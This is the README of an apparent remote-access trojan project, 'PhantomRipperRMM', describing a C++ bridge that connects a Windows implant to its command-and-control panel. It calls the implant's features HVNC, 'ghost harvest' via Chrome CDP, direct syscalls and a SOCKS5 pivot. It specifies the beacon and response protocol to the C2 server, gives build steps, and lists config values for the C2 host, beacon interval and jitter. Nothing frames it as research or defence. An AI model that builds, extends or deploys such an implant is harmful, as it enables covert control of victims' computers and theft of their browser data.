# PhantomRipperRMM — C++ Agent Bridge

The native C++ agent (PhantomRMM's `src/agent`) is the heavyweight Windows
implant: HVNC, Ghost (Chrome CDP), direct syscalls, SOCKS5 pivot. This folder
adapts it to the PhantomRipperRMM panel protocol so both the Python agent and
the C++ agent register in the same dashboard.

## Protocol (matches `panel/server/src/routes/beacon.js`)

```
POST {C2}/api/beacon
  { "session_id": "<hex>", "info": { "hostname","username","os","arch","pid","privilege","agent_type":"cpp" } }
  <- { "command": "<string>" | null }        # "__TERMINATE__" ends the agent

POST {C2}/api/response
  { "session_id": "<hex>", "command": "<echo>", "output": "<text|base64>" }
  <- { "status": "ok" }
```

`bridge/agent_beacon.hpp` is a drop-in WinHTTP client implementing that loop.
Include it from PhantomRMM's `main.cpp`, call `pr_beacon::run(cfg)` after the
agent initialises its crypto, and route returned commands through the existing
task dispatcher (shell exec, HVNC start, ghost harvest, socks start).

## Build

`build.ps1` stages the PhantomRMM sources next to this bridge and compiles the
agent with MSVC. For a reproducible build in CI/hosting, use
`../docker/Dockerfile.builder` (MinGW cross-compile).

## Config

Set these in `bridge/config.hpp` (or pass via `-D`):

| Define            | Meaning                                   |
|-------------------|-------------------------------------------|
| `PR_C2_HOST`      | Panel host (e.g. `c2.example.com`)        |
| `PR_C2_PORT`      | Panel port (e.g. `8443`)                  |
| `PR_C2_SCHEME`    | `https` or `http`                         |
| `PR_SESSION_ID`   | Session id baked at build time (optional) |
| `PR_BEACON_SECS`  | Beacon interval in seconds (default 5)    |
| `PR_JITTER`       | 0.0–1.0 jitter fraction (default 0.2)     |

The builder in the panel writes a `config_gen.h` with these values when
`agent_type=cpp` is selected; `build.ps1` force-includes it.
